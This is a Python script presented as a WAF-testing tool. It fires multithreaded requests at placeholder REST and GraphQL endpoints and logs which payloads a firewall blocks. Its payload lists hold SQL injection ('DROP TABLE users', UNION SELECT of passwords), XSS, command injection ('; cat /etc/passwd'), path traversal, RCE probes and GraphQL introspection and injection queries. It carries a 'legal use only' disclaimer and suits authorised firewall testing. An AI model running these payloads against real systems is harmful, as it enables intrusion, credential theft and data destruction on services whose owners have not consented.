#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF API & GraphQL Attack Simulator
Part of the WAF Testing Suite
Author: [Your Name]
Legal use only!
"""

import requests
import threading
import time
import json
from queue import Queue
from urllib.parse import urlencode

# -------------------------
# CONFIGURATION
# -------------------------
TARGETS = [
    # Beispiel REST
    {"url": "https://yourtargetdomain.com/api/user", "method": "GET", "type": "rest"},
    {"url": "https://yourtargetdomain.com/api/login", "method": "POST", "type": "rest"},
    # Beispiel GraphQL
    {"url": "https://yourtargetdomain.com/graphql", "method": "POST", "type": "graphql"}
]

THREADS = 5
DELAY_BETWEEN_REQUESTS = 0.3

# WAF Detection Keywords
BLOCK_KEYWORDS = ["blocked", "forbidden", "waf", "too many requests", "access denied"]

# Log files
LOG_BLOCK_FILE = "api_waf_blocks.txt"
LOG_SUCCESS_FILE = "api_success.txt"
LOG_ERROR_FILE = "api_errors.txt"

# Payloads
PAYLOADS = [
    # SQLi
    "' OR '1'='1 --",
    "1; DROP TABLE users --",
    "' UNION SELECT null, username, password FROM users --",
    # XSS
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    # Command Injection
    "; cat /etc/passwd",
    "| whoami",
    # Path Traversal
    "../../../../etc/passwd",
    # RCE
    "$(id)",
    "`whoami`"
]

# GraphQL-specific payloads
GRAPHQL_QUERIES = [
    # Simple Introspection
    {"query": "{ __schema { types { name } } }"},
    # Deep Query Abuse
    {"query": "{ a0:__schema { types { name fields { name type { name kind } } } } }"},
    # Injection in Arguments
    {"query": '{ user(id:"1 OR 1=1") { id name } }'}
]

# -------------------------
# HELPER FUNCTIONS
# -------------------------
def log(filename, text):
    with threading.Lock():
        with open(filename, "a", encoding="utf-8") as f:
            f.write(text + "\n")

def detect_waf_block(response_text):
    return any(kw.lower() in response_text.lower() for kw in BLOCK_KEYWORDS)

def test_rest_api(target):
    url = target["url"]
    method = target["method"].upper()

    for payload in PAYLOADS:
        try:
            if method == "GET":
                params = {"test": payload}
                r = requests.get(url, params=params, timeout=5)
            elif method == "POST":
                headers = {"Content-Type": "application/json"}
                body = {"test": payload}
                r = requests.post(url, headers=headers, json=body, timeout=5)
            else:
                continue

            if detect_waf_block(r.text):
                log(LOG_BLOCK_FILE, f"[BLOCK] {url} | Payload: {payload}")
                print(f"[BLOCK] {url} | Payload: {payload}")
            else:
                log(LOG_SUCCESS_FILE, f"[PASS] {url} | Payload: {payload} | Status: {r.status_code}")
                print(f"[PASS] {url} | Payload: {payload} ({r.status_code})")

        except requests.RequestException as e:
            log(LOG_ERROR_FILE, f"[ERROR] {url} | {e}")
            print(f"[ERROR] {url} | {e}")

def test_graphql_api(target):
    url = target["url"]

    for gql_payload in GRAPHQL_QUERIES:
        try:
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, headers=headers, json=gql_payload, timeout=5)

            if detect_waf_block(r.text):
                log(LOG_BLOCK_FILE, f"[BLOCK] {url} | GraphQL: {gql_payload}")
                print(f"[BLOCK] {url} | GraphQL: {gql_payload}")
            else:
                log(LOG_SUCCESS_FILE, f"[PASS] {url} | GraphQL: {gql_payload} | Status: {r.status_code}")
                print(f"[PASS] {url} | GraphQL: {gql_payload} ({r.status_code})")

        except requests.RequestException as e:
            log(LOG_ERROR_FILE, f"[ERROR] {url} | {e}")
            print(f"[ERROR] {url} | {e}")

# -------------------------
# THREAD WORKER
# -------------------------
def worker():
    while not target_queue.empty():
        try:
            target = target_queue.get_nowait()
        except:
            break

        if target["type"] == "rest":
            test_rest_api(target)
        elif target["type"] == "graphql":
            test_graphql_api(target)

        time.sleep(DELAY_BETWEEN_REQUESTS)

# -------------------------
# MAIN
# -------------------------
if __name__ == "__main__":
    target_queue = Queue()
    for t in TARGETS:
        target_queue.put(t)

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[DONE] API testing completed.")
